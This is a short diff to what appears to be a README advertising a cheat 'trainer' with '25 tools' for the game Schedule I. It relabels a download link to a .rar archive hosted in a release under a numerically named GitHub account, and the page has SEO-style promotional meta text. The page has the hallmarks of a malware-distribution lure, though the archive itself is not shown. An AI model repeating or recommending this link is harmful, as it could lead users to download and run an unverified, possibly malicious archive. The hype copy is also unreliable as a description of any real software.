@@ -1,6 +1,6 @@
 # Schedule I: Nightshade Reign v1.0 - 25 Tools of Dominion
 
-**[Claim Your Power](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Nightshade.Reign.v1.0.-.25.Tools.of.Dominion.rar)**  
+**[Download Trainer](https://github.com/m49357717/312434532/releases/download/32124435/Schedule.I.Nightshade.Reign.v1.0.-.25.Tools.of.Dominion.rar)**  
 
 **Meta Description**: Unleash Schedule I Nightshade Reign v1.0 with 25 ruthless tools. Command life, loot, and lawlessness to conquer Hyland’s underworld in 2025!
 
